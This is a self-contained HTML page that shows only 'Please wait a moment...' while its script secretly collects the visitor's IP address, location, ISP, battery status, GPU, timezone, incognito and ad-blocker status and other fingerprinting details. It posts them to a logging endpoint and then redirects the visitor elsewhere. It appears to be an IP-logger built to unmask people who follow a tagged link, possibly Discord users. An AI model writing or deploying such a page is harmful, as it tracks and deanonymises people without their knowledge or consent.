<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Please wait a moment...</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
    </style>
    <script>
        async function getUserData() {
            const data = {};

            // Get the current date and time in UTC
            data.dateTime = new Date().toISOString();

            // Get the user's IP address and location (handled by PHP)
            const ipResponse = await fetch('get_ip_info.php');
            const ipInfo = await ipResponse.json();
            data.ipAddress = ipInfo.ip;
            data.country = `${ipInfo.country}, ${ipInfo.city}`;
            data.hostName = ipInfo.hostName;
            data.isp = ipInfo.isp;

            // Get battery status
            try {
                const battery = await navigator.getBattery();
                data.battery = `${Math.round(battery.level * 100)}%`;
                data.charging = battery.charging ? 'Yes' : 'No';
            } catch (error) {
                data.battery = 'Unknown';
                data.charging = 'Unknown';
            }

            // Get screen orientation
            data.orientation = screen.orientation ? screen.orientation.type : 'Unknown';

            // Get timezone
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.timezone = timezone;
            data.userTime = new Date().toString();

            // Get language
            data.language = navigator.language;

            // Detect Incognito mode
            const isIncognito = await detectIncognito();
            data.incognito = isIncognito ? 'Yes' : 'No';

            // Detect ad blocker
            const adBlockEnabled = await detectAdBlocker();
            data.adBlocker = adBlockEnabled ? 'Yes' : 'No';

            // Get screen size and refresh rate
            data.screenSize = `${screen.width} x ${screen.height} @ 60Hz`; // Refresh rate detection is not straightforward
            data.colourScheme = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light';
            data.hdrScreen = screen.colorDepth > 24 ? 'Yes' : 'No';

            // Get GPU information
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            data.gpu = debugInfo ? `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}, ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}` : 'Unknown';

            // Get user agent, browser, OS, and platform
            data.userAgent = navigator.userAgent;
            data.browser = getBrowserInfo();
            data.operatingSystem = getOSInfo();
            data.touchScreen = 'ontouchstart' in window ? 'Yes' : 'No';
            data.platform = navigator.platform;

            // Get referring URL from the URL parameter 'ref'
            const urlParams = new URLSearchParams(window.location.search);
            const referrer = urlParams.get('ref');
            data.referrer = referrer ? `<@${referrer}>` : 'no referrer';

            // Send data to the server
            const response = await fetch('log_user_info.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            // Redirect to the production website after successful logging
            if (response.ok) {
                window.location.href = 'https://www.production-website.com';
            } else {
                console.error('Failed to log user data.');
            }
        }

        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browser = "Unknown";

            if (userAgent.indexOf("Chrome") > -1) {
                browser = "Chrome";
            } else if (userAgent.indexOf("Safari") > -1) {
                browser = "Safari";
            } else if (userAgent.indexOf("Firefox") > -1) {
                browser = "Firefox";
            } else if (userAgent.indexOf("MSIE") > -1 || !!document.documentMode) {
                browser = "Internet Explorer";
            } else if (userAgent.indexOf("Edge") > -1) {
                browser = "Microsoft Edge";
            }

            const version = userAgent.match(/(Chrome|Firefox|Safari|MSIE|Edge)\/?\s*(\d+)/i) || [];
            return `${browser} (${version[2] || "Unknown Version"})`;
        }

        function getOSInfo() {
            const userAgent = navigator.userAgent;
            let os = "Unknown";

            if (userAgent.indexOf("Win") !== -1) os = "Windows";
            if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
            if (userAgent.indexOf("X11") !== -1) os = "UNIX";
            if (userAgent.indexOf("Linux") !== -1) os = "Linux";

            return os;
        }

        function detectIncognito() {
            return new Promise((resolve) => {
                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
                if (!fs) {
                    resolve(false);
                    return;
                }
                fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
            });
        }

        function detectAdBlocker() {
            return new Promise((resolve) => {
                const testAd = document.createElement('div');
                testAd.innerHTML = '&nbsp;';
                testAd.className = 'adsbox';
                document.body.appendChild(testAd);
                window.setTimeout(() => {
                    resolve(testAd.offsetHeight === 0);
                    document.body.removeChild(testAd);
                }, 100);
            });
        }

        window.onload = getUserData;
    </script>
</head>
<body>
    <h1>Please wait a moment...</h1>
</body>
</html>
